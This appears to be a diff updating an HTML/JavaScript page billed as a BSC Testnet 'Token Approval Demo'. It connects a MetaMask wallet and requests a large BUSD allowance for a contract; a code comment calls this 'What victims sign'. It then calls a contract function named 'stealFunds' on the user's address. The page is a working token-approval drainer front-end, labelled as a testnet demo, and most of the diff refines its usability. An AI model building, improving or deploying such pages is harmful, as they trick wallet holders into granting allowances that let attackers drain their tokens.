@@ -2,12 +2,14 @@
 <html>
 <head>
     <title>Token Approval Demo (BSC Testnet)</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
     <style>
         body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
-        button { padding: 10px; margin: 5px; cursor: pointer; }
-        #walletInfo { display: none; margin-top: 20px; }
+        button { padding: 10px; margin: 5px; cursor: pointer; background: #f0f0f0; border: 1px solid #ccc; border-radius: 4px; }
+        button:hover { background: #e0e0e0; }
+        #walletInfo { display: none; margin-top: 20px; padding: 15px; border: 1px solid #eee; border-radius: 5px; }
         .warning { color: red; font-weight: bold; }
+        #status { margin-top: 10px; padding: 10px; background: #f8f8f8; border-radius: 4px; }
     </style>
 </head>
 <body>
@@ -21,7 +23,7 @@
         <button id="checkAllowance">Check BUSD Approval</button>
         <button id="requestApproval">Request BUSD Approval</button>
         <button id="demoTransfer">Simulate Transfer (Owner Only)</button>
-        <p id="status"></p>
+        <div id="status"></div>
     </div>
 
     <script>
@@ -33,88 +35,147 @@
         let web3;
         let accounts = [];
 
-        // Connect Wallet
-        document.getElementById('connectWallet').onclick = async () => {
+        // Modern MetaMask connection
+        async function connectWallet() {
             if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
                 try {
+                    // Request account access
                     accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    
+                    // Create Web3 instance
+                    web3 = new Web3(window.ethereum);
+                    
+                    // Check network
+                    const chainId = await web3.eth.getChainId();
+                    if (chainId !== 97) { // BSC Testnet chainId
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_switchEthereumChain',
+                                params: [{ chainId: '0x61' }], // 0x61 = 97 in decimal (BSC Testnet)
+                            });
+                        } catch (switchError) {
+                            // If network not added to MetaMask
+                            if (switchError.code === 4902) {
+                                await window.ethereum.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x61',
+                                        chainName: 'Binance Smart Chain Testnet',
+                                        nativeCurrency: {
+                                            name: 'BNB',
+                                            symbol: 'BNB',
+                                            decimals: 18
+                                        },
+                                        rpcUrls: ['https://data-seed-prebsc-1-s1.binance.org:8545/'],
+                                        blockExplorerUrls: ['https://testnet.bscscan.com/']
+                                    }]
+                                });
+                            }
+                        }
+                    }
+                    
                     document.getElementById('walletAddress').textContent = accounts[0];
                     document.getElementById('walletInfo').style.display = 'block';
-                    updateStatus("Wallet connected. Switch to BSC Testnet!");
+                    updateStatus("Wallet connected to BSC Testnet!");
+                    
+                    // Refresh when account changes
+                    window.ethereum.on('accountsChanged', (newAccounts) => {
+                        accounts = newAccounts;
+                        document.getElementById('walletAddress').textContent = accounts[0];
+                        updateStatus("Account changed. Please refresh the page.");
+                    });
+                    
+                    // Refresh when network changes
+                    window.ethereum.on('chainChanged', () => {
+                        window.location.reload();
+                    });
+                    
                 } catch (error) {
-                    updateStatus("User denied access.");
+                    updateStatus("Connection error: " + error.message);
                 }
             } else {
-                updateStatus("MetaMask not detected!");
+                updateStatus("MetaMask not detected! Please install it from https://metamask.io");
             }
-        };
+        }
 
         // Check BUSD Allowance
-        document.getElementById('checkAllowance').onclick = async () => {
-            const erc20 = new web3.eth.Contract([
-                {
-                    "constant": true,
-                    "inputs": [
-                        {"name": "owner", "type": "address"},
-                        {"name": "spender", "type": "address"}
-                    ],
-                    "name": "allowance",
-                    "outputs": [{"name": "", "type": "uint256"}],
-                    "type": "function"
-                }
-            ], BUSD_TESTNET);
+        async function checkAllowance() {
+            try {
+                const erc20 = new web3.eth.Contract([
+                    {
+                        "constant": true,
+                        "inputs": [
+                            {"name": "owner", "type": "address"},
+                            {"name": "spender", "type": "address"}
+                        ],
+                        "name": "allowance",
+                        "outputs": [{"name": "", "type": "uint256"}],
+                        "type": "function"
+                    }
+                ], BUSD_TESTNET);
 
-            const allowance = await erc20.methods.allowance(accounts[0], DEMO_CONTRACT).call();
-            updateStatus(`Current BUSD allowance: ${allowance / 1e18} (Raw: ${allowance})`);
-        };
+                const allowance = await erc20.methods.allowance(accounts[0], DEMO_CONTRACT).call();
+                updateStatus(`Current BUSD allowance: ${allowance / 1e18} (Raw: ${allowance})`);
+            } catch (error) {
+                updateStatus(`Error checking allowance: ${error.message}`);
+            }
+        }
 
         // Request Approval (What victims sign)
-        document.getElementById('requestApproval').onclick = async () => {
-            const erc20 = new web3.eth.Contract([
-                {
-                    "constant": false,
-                    "inputs": [
-                        {"name": "spender", "type": "address"},
-                        {"name": "amount", "type": "uint256"}
-                    ],
-                    "name": "approve",
-                    "outputs": [{"name": "", "type": "bool"}],
-                    "type": "function"
-                }
-            ], BUSD_TESTNET);
-
+        async function requestApproval() {
             try {
-                await erc20.methods.approve(DEMO_CONTRACT, web3.utils.toWei("1000000")).send({ from: accounts[0] });
-                updateStatus("Approval successful! Now the contract can move your test BUSD.");
+                const erc20 = new web3.eth.Contract([
+                    {
+                        "constant": false,
+                        "inputs": [
+                            {"name": "spender", "type": "address"},
+                            {"name": "amount", "type": "uint256"}
+                        ],
+                        "name": "approve",
+                        "outputs": [{"name": "", "type": "bool"}],
+                        "type": "function"
+                    }
+                ], BUSD_TESTNET);
+
+                const tx = await erc20.methods
+                    .approve(DEMO_CONTRACT, web3.utils.toWei("1000000"))
+                    .send({ from: accounts[0] });
+                
+                updateStatus(`Approval successful! TX: <a href="https://testnet.bscscan.com/tx/${tx.transactionHash}" target="_blank">View on BscScan</a>`);
             } catch (error) {
                 updateStatus(`Approval failed: ${error.message}`);
             }
-        };
+        }
 
         // Simulate Transfer (Only owner can call)
-        document.getElementById('demoTransfer').onclick = async () => {
-            const contract = new web3.eth.Contract([
-                {
-                    "constant": false,
-                    "inputs": [{"name": "victim", "type": "address"}],
-                    "name": "stealFunds",
-                    "outputs": [],
-                    "type": "function"
-                }
-            ], DEMO_CONTRACT);
-
+        async function demoTransfer() {
             try {
-                await contract.methods.stealFunds(accounts[0]).send({ from: accounts[0] });
-                updateStatus("Funds transferred to 0xefd4...C170. Check BscScan!");
+                const contract = new web3.eth.Contract([
+                    {
+                        "constant": false,
+                        "inputs": [{"name": "victim", "type": "address"}],
+                        "name": "stealFunds",
+                        "outputs": [],
+                        "type": "function"
+                    }
+                ], DEMO_CONTRACT);
+
+                const tx = await contract.methods.stealFunds(accounts[0]).send({ from: accounts[0] });
+                updateStatus(`Funds transferred! TX: <a href="https://testnet.bscscan.com/tx/${tx.transactionHash}" target="_blank">View on BscScan</a>`);
             } catch (error) {
                 updateStatus(`Transfer failed: ${error.message}`);
             }
-        };
+        }
 
         function updateStatus(message) {
             document.getElementById('status').innerHTML = message;
         }
+
+        // Event listeners
+        document.getElementById('connectWallet').addEventListener('click', connectWallet);
+        document.getElementById('checkAllowance').addEventListener('click', checkAllowance);
+        document.getElementById('requestApproval').addEventListener('click', requestApproval);
+        document.getElementById('demoTransfer').addEventListener('click', demoTransfer);
     </script>
 </body>
 </html>
